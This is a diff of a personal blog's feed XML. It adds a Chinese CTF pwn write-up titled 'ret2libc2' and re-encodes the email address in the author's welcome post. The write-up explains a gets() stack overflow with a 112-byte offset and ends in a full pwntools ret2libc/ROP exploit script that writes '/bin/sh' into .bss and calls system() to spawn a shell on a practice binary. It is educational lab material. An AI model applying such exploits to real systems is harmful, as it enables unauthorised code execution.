@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>ret2libc2</title>
+    <link href="/2021/03/14/ret2libc2/"/>
+    <url>/2021/03/14/ret2libc2/</url>
+    
+    <content type="html"><![CDATA[<p>先checksec，还是开了NX，就不能用shellcode了。</p><p><img src="4.png"></p><p>看ida</p><p><img src="1.png"></p><p>gets存在栈溢出漏洞，cyclic计算一下地址偏移量</p><p><img src="2.png"></p><p>偏移地址仍然是112，那么填充112个垃圾数据就能劫持返回地址。</p><p><img src="3.png"></p><p>在ida里看到有system的plt地址，但是没有找到/bin/sh，所以要手动把/bin/sh填充进去，然后有了binsh的地址，就能作为system的参数，这样就变成了ret2libc1。</p><p>然后是写ROPgadgets再次调用gets，把/bin/sh输入bss段里，这里bss段刚好有一个buf2可以放。</p><p><img src="6.png"></p><p>接下来是找到gets的地址。</p><p><img src="5.png"></p><p>就可以写exp啦</p><p>这里有两种方法，参见<a href="https://www.jianshu.com/p/c4780335b842">https://www.jianshu.com/p/c4780335b842</a></p><p>第二种用到栈堆平衡，就要先把gets的参数pop出来，pop到哪都无所谓，所以就ROP找一找pop的指令</p><p><img src="7.png"></p><p>随便用一个短的pop ebx</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">p</span> = process(&#x27;./ret<span class="hljs-number">2</span>libc<span class="hljs-number">2</span>&#x27;)<br><span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;<br><span class="hljs-attribute">gdb</span>.attach(p)<br><br><span class="hljs-attribute">system_plt</span> = <span class="hljs-number">0</span>x<span class="hljs-number">08048490</span><br><span class="hljs-attribute">gets_plt</span> = <span class="hljs-number">0</span>x<span class="hljs-number">08048460</span><br><span class="hljs-attribute">buf2</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0804</span>a<span class="hljs-number">080</span><br><span class="hljs-attribute">pop_ebx</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0804843</span>d<br><span class="hljs-attribute">p</span>.recvuntil(&#x27;What do you think ?&#x27;)<br><span class="hljs-comment"># payload = &#x27;a&#x27; * 112 + p32(gets_plt) +p32(system_plt) +p32(buf2)+ p32(buf2)</span><br><span class="hljs-attribute">payload</span> = &#x27;a&#x27; * <span class="hljs-number">112</span> + p<span class="hljs-number">32</span>(gets_plt) + p<span class="hljs-number">32</span>(pop_ebx) + p<span class="hljs-number">32</span>(buf<span class="hljs-number">2</span>) + p<span class="hljs-number">32</span>(system_plt) +&#x27;b&#x27; * <span class="hljs-number">4</span> + p<span class="hljs-number">32</span>(buf<span class="hljs-number">2</span>)<br><span class="hljs-attribute">p</span>.send(payload)<br><span class="hljs-attribute">p</span>.sendline(&#x27;/bin/sh&#x27;)<br><br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></div></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>pwn</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>ret2libc1</title>
     <link href="/2021/03/10/ret2libc1/"/>
     <url>/2021/03/10/ret2libc1/</url>
@@ -166,7 +185,7 @@
     <link href="/2021/01/01/+Mg%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
     <url>/2021/01/01/+Mg%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
     
-    <content type="html"><![CDATA[<h2 id="一点感想"><a href="#一点感想" class="headerlink" title="一点感想"></a>一点感想</h2><h3 id="01"><a href="#01" class="headerlink" title="01"></a>01</h3><p>学习过程中的琐碎知识点与方法，时时值得记录，记录下自己的学习轨迹，以求温故知新，不记下来的话，回望来时的路似乎有点空荡</p><h3 id="02"><a href="#02" class="headerlink" title="02"></a>02</h3><p>可能要学很多很多不同领域的知识，大概方便自己区分一下（？）</p><h3 id="03"><a href="#03" class="headerlink" title="03"></a>03</h3><p>会把学到的大大小小的知识点、解决的大大小小的问题、做过的大大小小的题都记下来，大概是个日记本</p><h3 id="04"><a href="#04" class="headerlink" title="04"></a>04</h3><p>blog模板有一些功能还不太会用，接下来会慢慢学习<br>该blog采用模板：fluid搭建，后续会加一些实用（花里胡哨）的功能，比如评论区和音乐播放器和友链（如果有hxd愿意的话）</p><h3 id="05"><a href="#05" class="headerlink" title="05"></a>05</h3><p>用国内网络访问会有亿点点慢，后期可能会换成私人服务器，如果有奇怪的bug存在，pls联系<a href="mailto:&#x31;&#x37;&#53;&#x36;&#53;&#x36;&#x37;&#56;&#x31;&#52;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#x6d;">&#x31;&#x37;&#53;&#x36;&#53;&#x36;&#x37;&#56;&#x31;&#52;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#x6d;</a></p><h3 id="06"><a href="#06" class="headerlink" title="06"></a>06</h3><p>关于页有我的github，可能后面会慢慢开始用，但现在是一片荒地（</p><h3 id="07"><a href="#07" class="headerlink" title="07"></a>07</h3><p>还没有决定方向，大概突然想学什么就学什么</p><h3 id="08"><a href="#08" class="headerlink" title="08"></a>08</h3><p>大概是要告诫自己：万丈高楼平地起，勿在浮沙筑高台</p>]]></content>
+    <content type="html"><![CDATA[<h2 id="一点感想"><a href="#一点感想" class="headerlink" title="一点感想"></a>一点感想</h2><h3 id="01"><a href="#01" class="headerlink" title="01"></a>01</h3><p>学习过程中的琐碎知识点与方法，时时值得记录，记录下自己的学习轨迹，以求温故知新，不记下来的话，回望来时的路似乎有点空荡</p><h3 id="02"><a href="#02" class="headerlink" title="02"></a>02</h3><p>可能要学很多很多不同领域的知识，大概方便自己区分一下（？）</p><h3 id="03"><a href="#03" class="headerlink" title="03"></a>03</h3><p>会把学到的大大小小的知识点、解决的大大小小的问题、做过的大大小小的题都记下来，大概是个日记本</p><h3 id="04"><a href="#04" class="headerlink" title="04"></a>04</h3><p>blog模板有一些功能还不太会用，接下来会慢慢学习<br>该blog采用模板：fluid搭建，后续会加一些实用（花里胡哨）的功能，比如评论区和音乐播放器和友链（如果有hxd愿意的话）</p><h3 id="05"><a href="#05" class="headerlink" title="05"></a>05</h3><p>用国内网络访问会有亿点点慢，后期可能会换成私人服务器，如果有奇怪的bug存在，pls联系<a href="mailto:&#49;&#55;&#53;&#x36;&#x35;&#x36;&#55;&#56;&#49;&#x34;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#49;&#55;&#53;&#x36;&#x35;&#x36;&#55;&#56;&#49;&#x34;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;</a></p><h3 id="06"><a href="#06" class="headerlink" title="06"></a>06</h3><p>关于页有我的github，可能后面会慢慢开始用，但现在是一片荒地（</p><h3 id="07"><a href="#07" class="headerlink" title="07"></a>07</h3><p>还没有决定方向，大概突然想学什么就学什么</p><h3 id="08"><a href="#08" class="headerlink" title="08"></a>08</h3><p>大概是要告诫自己：万丈高楼平地起，勿在浮沙筑高台</p>]]></content>
     
     
     <categories>
